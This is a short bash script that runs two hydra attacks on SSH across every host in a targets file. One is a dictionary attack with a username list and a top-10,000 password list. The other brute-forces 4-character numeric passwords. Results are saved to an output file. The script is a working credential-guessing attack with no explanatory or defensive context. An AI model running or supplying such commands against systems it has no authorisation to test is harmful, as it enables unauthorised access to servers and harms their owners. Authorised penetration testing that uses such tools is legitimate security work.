#!/bin/bash

# SSH Dictionary
hydra \
    -L users_ssh_dictionary.txt \
    -P 10-million-password-list-top-10000.txt \
    -M targets.txt \
    -o output.txt \
    -u -e nsr ssh

# SSH Bruteforce
hydra \
    -L users_ssh_bruteforce.txt \
    -x 4:4:1 \
    -M targets.txt \
    -o output.txt \
    -u ssh
